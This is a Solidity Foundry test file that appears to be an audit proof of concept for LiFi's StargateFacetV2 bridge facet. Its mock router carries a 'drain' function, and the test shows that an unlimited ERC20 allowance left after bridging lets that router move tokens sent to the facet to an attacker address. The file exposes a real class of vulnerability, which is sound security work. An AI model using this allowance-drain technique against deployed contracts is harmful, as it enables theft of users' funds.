// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {StargateFacetV2} from "lifi/Facets/StargateFacetV2.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";
import {IStargate, ITokenMessaging} from "lifi/Interfaces/IStargate.sol";

contract MockTokenMessaging is ITokenMessaging {
    mapping(uint16 => address) public impls;

    function setImpl(uint16 assetId, address router) external {
        impls[assetId] = router;
    }

    function assetIds(address) external pure returns (uint16) {
        return 0;
    }

    function stargateImpls(uint16 assetId) external view returns (address) {
        return impls[assetId];
    }
}

contract MockStargateRouter is IStargate {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function sendToken(
        SendParam calldata _sendParam,
        MessagingFee calldata,
        address
    )
        external
        payable
        override
        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt, Ticket memory ticket)
    {
        MockERC20(token).transferFrom(msg.sender, address(this), _sendParam.amountLD);
        msgReceipt = MessagingReceipt({guid: bytes32(0), nonce: 0, fee: MessagingFee({nativeFee: 0, lzTokenFee: 0})});
        oftReceipt = OFTReceipt({amountSentLD: _sendParam.amountLD, amountReceivedLD: _sendParam.amountLD});
        ticket = Ticket({ticketId: 0, passengerBytes: bytes("")});
    }

    function quoteOFT(
        SendParam calldata
    )
        external
        pure
        override
        returns (OFTLimit memory limit, OFTFeeDetail[] memory oftFeeDetails, OFTReceipt memory receipt)
    {
        limit = OFTLimit({minAmountLD: 0, maxAmountLD: 0});
        receipt = OFTReceipt({amountSentLD: 0, amountReceivedLD: 0});
        oftFeeDetails = new OFTFeeDetail[](0);
    }

    function quoteSend(
        SendParam calldata,
        bool
    ) external pure override returns (MessagingFee memory fee) {
        fee = MessagingFee({nativeFee: 0, lzTokenFee: 0});
    }

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract StargateFacetV2AllowanceTest is Test {
    MockERC20 internal token;
    MockStargateRouter internal router;
    MockTokenMessaging internal tokenMessaging;
    StargateFacetV2 internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        router = new MockStargateRouter(address(token));
        tokenMessaging = new MockTokenMessaging();
        tokenMessaging.setImpl(1, address(router));
        facet = new StargateFacetV2(address(tokenMessaging));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        IStargate.SendParam memory sendParam = IStargate.SendParam({
            dstEid: 1,
            to: bytes32(uint256(uint160(bridgeData.receiver))),
            amountLD: 0,
            minAmountLD: 0,
            extraOptions: "",
            composeMsg: "",
            oftCmd: ""
        });

        IStargate.MessagingFee memory fee = IStargate.MessagingFee({
            nativeFee: 0,
            lzTokenFee: 0
        });

        StargateFacetV2.StargateData memory stargateData = StargateFacetV2.StargateData({
            assetId: 1,
            sendParams: sendParam,
            fee: fee,
            refundAddress: payable(address(this))
        });

        facet.startBridgeTokensViaStargate(bridgeData, stargateData);

        // allowance remains set to max
        assertEq(token.allowance(address(facet), address(router)), type(uint256).max);

        // attacker sends tokens to facet and router drains them
        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

